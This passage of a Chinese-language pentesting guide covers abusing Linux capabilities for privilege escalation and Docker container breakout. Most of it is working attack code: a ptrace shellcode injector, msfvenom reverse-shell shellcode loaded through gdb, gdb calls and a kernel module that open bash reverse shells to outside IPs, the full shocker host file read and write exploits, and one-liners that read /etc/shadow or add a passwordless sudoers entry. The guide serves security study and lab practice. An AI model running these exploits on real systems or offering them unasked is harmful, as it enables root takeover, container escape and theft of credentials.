# Structure defined in &lt;sys/user.h&gt;
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("&lt;I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
</code></pre>
<p><strong>使用二进制的示例 (gdb)</strong></p>
<p><code>gdb</code> 具有 <code>ptrace</code> 能力：</p>
<pre><code>/usr/bin/gdb = cap_sys_ptrace+ep
</code></pre>
<pre><code class="language-markdown">使用 msfvenom 创建一个 shellcode 以通过 gdb 注入内存
</code></pre>
<pre><code class="language-python"># msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
</code></pre>
<p>调试一个 root 进程使用 gdb，并复制粘贴之前生成的 gdb 行：</p>
<pre><code class="language-bash"># Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' &gt; commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
</code></pre>
<p><strong>示例与环境（Docker 突破） - 另一个 gdb 滥用</strong></p>
<p>如果 <strong>GDB</strong> 已安装（或者你可以通过 <code>apk add gdb</code> 或 <code>apt install gdb</code> 安装它），你可以 <strong>从主机调试一个进程</strong> 并使其调用 <code>system</code> 函数。（此技术还需要能力 <code>SYS_ADMIN</code>）<strong>。</strong></p>
<pre><code class="language-bash">gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.115.135/5656 0&gt;&amp;1'")
</code></pre>
<p>您将无法看到执行命令的输出，但该进程将执行该命令（因此获取反向 shell）。</p>
<p>{% hint style="warning" %}
如果您收到错误 "No symbol "system" in current context."，请检查通过 gdb 在程序中加载 shellcode 的前一个示例。
{% endhint %}</p>
<p><strong>带环境的示例（Docker 突破） - Shellcode 注入</strong></p>
<p>您可以使用以下命令检查 docker 容器内启用的能力：</p>
<pre><code class="language-bash">capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
</code></pre>
<p>列出 <strong>主机</strong> 中运行的 <strong>进程</strong> <code>ps -eaf</code></p>
<ol>
<li>获取 <strong>架构</strong> <code>uname -m</code></li>
<li>查找该架构的 <strong>shellcode</strong> (<a href="https://www.exploit-db.com/exploits/41128">https://www.exploit-db.com/exploits/41128</a>)</li>
<li>查找一个 <strong>程序</strong> 以 <strong>注入</strong> <strong>shellcode</strong> 到进程内存中 (<a href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c">https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</a>)</li>
<li><strong>修改</strong> 程序中的 <strong>shellcode</strong> 并 <strong>编译</strong> 它 <code>gcc inject.c -o inject</code></li>
<li><strong>注入</strong> 并获取你的 <strong>shell</strong>: <code>./inject 299; nc 172.17.0.1 5600</code></li>
</ol>
<h2 id="cap_sys_module"><a class="header" href="#cap_sys_module">CAP_SYS_MODULE</a></h2>
<p><strong><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><code>CAP_SYS_MODULE</code></a></strong> 使进程能够 <strong>加载和卸载内核模块 (<code>init_module(2)</code>、<code>finit_module(2)</code> 和 <code>delete_module(2)</code> 系统调用)</strong>，提供对内核核心操作的直接访问。此能力带来了严重的安全风险，因为它允许特权提升和完全系统妥协，通过允许对内核的修改，从而绕过所有Linux安全机制，包括Linux安全模块和容器隔离。
<strong>这意味着你可以</strong> <strong>在主机的内核中插入/移除内核模块。</strong></p>
<p><strong>带有二进制文件的示例</strong></p>
<p>在以下示例中，二进制文件 <strong><code>python</code></strong> 拥有此能力。</p>
<pre><code class="language-bash">getcap -r / 2&gt;/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
</code></pre>
<p>默认情况下，<strong><code>modprobe</code></strong> 命令会检查目录 <strong><code>/lib/modules/$(uname -r)</code></strong> 中的依赖列表和映射文件。<br />
为了利用这一点，让我们创建一个假的 <strong>lib/modules</strong> 文件夹：</p>
<pre><code class="language-bash">mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
</code></pre>
<p>然后<strong>编译内核模块，您可以在下面找到 2 个示例，并将其复制</strong>到此文件夹：</p>
<pre><code class="language-bash">cp reverse-shell.ko lib/modules/$(uname -r)/
</code></pre>
<p>最后，执行所需的python代码以加载此内核模块：</p>
<pre><code class="language-python">import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
</code></pre>
<p><strong>示例 2 与二进制文件</strong></p>
<p>在以下示例中，二进制文件 <strong><code>kmod</code></strong> 具有此能力。</p>
<pre><code class="language-bash">getcap -r / 2&gt;/dev/null
/bin/kmod = cap_sys_module+ep
</code></pre>
<p>这意味着可以使用命令 <strong><code>insmod</code></strong> 插入内核模块。按照下面的示例获取一个 <strong>reverse shell</strong> 滥用此权限。</p>
<p><strong>带环境的示例（Docker 突破）</strong></p>
<p>您可以使用以下命令检查 Docker 容器内启用的能力：</p>
<pre><code class="language-bash">capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
</code></pre>
<p>在之前的输出中，您可以看到 <strong>SYS_MODULE</strong> 权限已启用。</p>
<p><strong>创建</strong> 将执行反向 shell 的 <strong>内核模块</strong> 和 <strong>Makefile</strong> 以 <strong>编译</strong> 它：</p>
<p>{% code title="reverse-shell.c" %}</p>
<pre><code class="language-c">#include &lt;linux/kmod.h&gt;
#include &lt;linux/module.h&gt;
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
</code></pre>
<p>{% endcode %}</p>
<p>{% code title="Makefile" %}</p>
<pre><code class="language-bash">obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
</code></pre>
<p>{% endcode %}</p>
<p>{% hint style="warning" %}
Makefile 中每个 make 单词前的空白字符 <strong>必须是制表符，而不是空格</strong>！
{% endhint %}</p>
<p>执行 <code>make</code> 进行编译。</p>
<pre><code>ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
</code></pre>
<p>最后，在一个 shell 中启动 <code>nc</code>，然后从另一个 shell <strong>加载模块</strong>，你将会在 nc 进程中捕获到 shell：</p>
<pre><code class="language-bash">#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
</code></pre>
<p><strong>该技术的代码来自于“滥用 SYS_MODULE 能力”的实验室</strong> <a href="https://www.pentesteracademy.com"><strong>https://www.pentesteracademy.com/</strong></a></p>
<p>该技术的另一个示例可以在 <a href="https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host">https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host</a> 找到。</p>
<h2 id="cap_dac_read_search"><a class="header" href="#cap_dac_read_search">CAP_DAC_READ_SEARCH</a></h2>
<p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html"><strong>CAP_DAC_READ_SEARCH</strong></a> 使进程能够 <strong>绕过读取文件和读取及执行目录的权限</strong>。它的主要用途是用于文件搜索或读取。然而，它还允许进程使用 <code>open_by_handle_at(2)</code> 函数，该函数可以访问任何文件，包括那些在进程的挂载命名空间之外的文件。在 <code>open_by_handle_at(2)</code> 中使用的句柄应该是通过 <code>name_to_handle_at(2)</code> 获得的非透明标识符，但它可以包含易受篡改的敏感信息，如 inode 号。该能力的潜在利用，特别是在 Docker 容器的上下文中，已由 Sebastian Krahmer 通过 shocker 漏洞进行了演示，分析见 <a href="https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3">这里</a>。
<strong>这意味着您可以</strong> <strong>绕过文件读取权限检查和目录读取/执行权限检查。</strong></p>
<p><strong>带有二进制文件的示例</strong></p>
<p>该二进制文件将能够读取任何文件。因此，如果像 tar 这样的文件具有此能力，它将能够读取 shadow 文件：</p>
<pre><code class="language-bash">cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
</code></pre>
<p><strong>Example with binary2</strong></p>
<p>在这种情况下，假设 <strong><code>python</code></strong> 二进制文件具有此能力。为了列出根文件，您可以执行：</p>
<pre><code class="language-python">import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
</code></pre>
<p>为了读取一个文件，你可以这样做：</p>
<pre><code class="language-python">print(open("/etc/shadow", "r").read())
</code></pre>
<p><strong>在环境中的示例（Docker 突破）</strong></p>
<p>您可以使用以下命令检查 Docker 容器内启用的能力：</p>
<pre><code>capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
</code></pre>
<p>在之前的输出中，您可以看到 <strong>DAC_READ_SEARCH</strong> 能力已启用。因此，容器可以 <strong>调试进程</strong>。</p>
<p>您可以在 <a href="https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3">https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3</a> 学习以下利用的工作原理，但简而言之，<strong>CAP_DAC_READ_SEARCH</strong> 不仅允许我们在没有权限检查的情况下遍历文件系统，还明确移除了对 <em><strong>open_by_handle_at(2)</strong></em> 的任何检查，并且 <strong>可能允许我们的进程访问其他进程打开的敏感文件</strong>。</p>
<p>滥用此权限从主机读取文件的原始利用可以在这里找到：<a href="http://stealth.openwall.net/xSports/shocker.c">http://stealth.openwall.net/xSports/shocker.c</a>，以下是一个 <strong>修改版本，允许您将要读取的文件作为第一个参数指示，并将其转储到文件中。</strong></p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;dirent.h&gt;
#include &lt;stdint.h&gt;

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h-&gt;handle_bytes,
h-&gt;handle_type);
for (int i = 0; i &lt; h-&gt;handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h-&gt;f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i &lt; h-&gt;handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh-&gt;f_handle, ih-&gt;f_handle, sizeof(oh-&gt;f_handle));
oh-&gt;handle_type = 1;
oh-&gt;handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) &lt; 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de-&gt;d_name);
if (strncmp(de-&gt;d_name, path, strlen(de-&gt;d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de-&gt;d_name, (int)de-&gt;d_ino);
ino = de-&gt;d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i &lt; 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &amp;ino, sizeof(ino));
memcpy(outh.f_handle + 4, &amp;i, sizeof(i));
if ((i % (1&lt;&lt;20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de-&gt;d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&amp;outh, 0) &gt; 0) {
closedir(dir);
close(fd);
dump_handle(&amp;outh);
return find_handle(bfd, path, &amp;outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n&lt;enter&gt;\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) &lt; 0)
die("[-] open");

if (find_handle(fd1, argv[1], &amp;root_h, &amp;h) &lt;= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&amp;h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&amp;h, O_RDONLY)) &lt; 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) &lt; 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
</code></pre>
<p>{% hint style="warning" %}
该漏洞需要找到指向主机上某个挂载内容的指针。原始漏洞使用了文件 /.dockerinit，而这个修改版本使用 /etc/hostname。如果漏洞无法工作，您可能需要设置不同的文件。要找到在主机上挂载的文件，只需执行 mount 命令：
{% endhint %}</p>
<p><img src="../../.gitbook/assets/image%20(407)%20(1).png" alt="" /></p>
<p><strong>该技术的代码来自于“滥用 DAC_READ_SEARCH 能力”的实验室</strong> <a href="https://www.pentesteracademy.com"><strong>https://www.pentesteracademy.com/</strong></a></p>
<p>​</p>
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
<p>​​​​​​​​​​​<a href="https://www.rootedcon.com/"><strong>RootedCON</strong></a> 是 <strong>西班牙</strong> 最相关的网络安全事件，也是 <strong>欧洲</strong> 最重要的事件之一。该大会的 <strong>使命是促进技术知识</strong>，是各个学科的技术和网络安全专业人士的一个热烈交流点。</p>
<p>{% embed url="https://www.rootedcon.com/" %}</p>
<h2 id="cap_dac_override"><a class="header" href="#cap_dac_override">CAP_DAC_OVERRIDE</a></h2>
<p><strong>这意味着您可以绕过对任何文件的写入权限检查，因此您可以写入任何文件。</strong></p>
<p>有很多文件您可以 <strong>覆盖以提升权限，</strong> <a href="payloads-to-execute.html#overwriting-a-file-to-escalate-privileges"><strong>您可以从这里获取灵感</strong></a>。</p>
<p><strong>使用二进制文件的示例</strong></p>
<p>在此示例中，vim 拥有此能力，因此您可以修改任何文件，如 <em>passwd</em>、<em>sudoers</em> 或 <em>shadow</em>：</p>
<pre><code class="language-bash">getcap -r / 2&gt;/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
</code></pre>
<p><strong>示例与二进制文件 2</strong></p>
<p>在这个示例中，<strong><code>python</code></strong> 二进制文件将具有此能力。您可以使用 python 来覆盖任何文件：</p>
<pre><code class="language-python">file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
</code></pre>
<p><strong>示例：环境 + CAP_DAC_READ_SEARCH（Docker突破）</strong></p>
<p>您可以使用以下命令检查docker容器内启用的能力：</p>
<pre><code class="language-bash">capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
</code></pre>
<p>首先阅读前一节 <a href="linux-capabilities.html#cap_dac_read_search"><strong>滥用 DAC_READ_SEARCH 能力以读取任意文件</strong></a> 的内容，并 <strong>编译</strong> 利用程序。<br />
然后，<strong>编译以下版本的 shocker 利用程序</strong>，这将允许您在主机文件系统中 <strong>写入任意文件</strong>：</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;dirent.h&gt;
#include &lt;stdint.h&gt;

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -&gt; handle_bytes,
h -&gt; handle_type);
for (int i = 0; i &lt; h -&gt; handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -&gt; f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i &lt; h -&gt; handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -&gt; f_handle, ih -&gt; f_handle, sizeof(oh -&gt; f_handle));
oh -&gt; handle_type = 1;
oh -&gt; handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) &lt; 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -&gt; d_name);
if (strncmp(de -&gt; d_name, path, strlen(de -&gt; d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -&gt; d_name, (int) de -&gt; d_ino);
ino = de -&gt; d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i &lt; 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &amp; ino, sizeof(ino));
memcpy(outh.f_handle + 4, &amp; i, sizeof(i));
if ((i % (1 &lt;&lt; 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -&gt; d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) &amp; outh, 0) &gt; 0) {
closedir(dir);
close(fd);
dump_handle( &amp; outh);
return find_handle(bfd, path, &amp; outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n&lt;enter&gt;\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) &lt; 0)
die("[-] open");
if (find_handle(fd1, argv[1], &amp; root_h, &amp; h) &lt;= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( &amp; h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) &amp; h, O_RDWR)) &lt; 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( &amp; line, &amp; len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
</code></pre>
<p>为了逃离docker容器，你可以<strong>下载</strong>主机上的文件<code>/etc/shadow</code>和<code>/etc/passwd</code>，<strong>添加</strong>一个<strong>新用户</strong>，并使用**<code>shocker_write</code><strong>来覆盖它们。然后，通过</strong>ssh<strong>进行</strong>访问**。</p>
<p><strong>该技术的代码来自于“滥用DAC_OVERRIDE能力”的实验室</strong> <a href="https://www.pentesteracademy.com"><strong>https://www.pentesteracademy.com</strong></a></p>
<h2 id="cap_chown"><a class="header" href="#cap_chown">CAP_CHOWN</a></h2>
<p><strong>这意味着可以更改任何文件的所有权。</strong></p>
<p><strong>带有二进制文件的示例</strong></p>
<p>假设**<code>python</code><strong>二进制文件具有此能力，你可以</strong>更改****shadow<strong>文件的</strong>所有者**，<strong>更改root密码</strong>，并提升权限：</p>
<pre><code class="language-bash">python -c 'import os;os.chown("/etc/shadow",1000,1000)'
</code></pre>
<p>或者**<code>ruby</code>**二进制文件具有此能力：</p>
<pre><code class="language-bash">ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
</code></pre>
<h2 id="cap_fowner"><a class="header" href="#cap_fowner">CAP_FOWNER</a></h2>
<p><strong>这意味着可以更改任何文件的权限。</strong></p>
<p><strong>带有二进制的示例</strong></p>
<p>如果python具有此能力，您可以修改shadow文件的权限，<strong>更改root密码</strong>，并提升权限：</p>
<pre><code class="language-bash">python -c 'import os;os.chmod("/etc/shadow",0666)
</code></pre>
<h3 id="cap_setuid"><a class="header" href="#cap_setuid">CAP_SETUID</a></h3>
<p><strong>这意味着可以设置创建进程的有效用户 ID。</strong></p>
<p><strong>带有二进制文件的示例</strong></p>
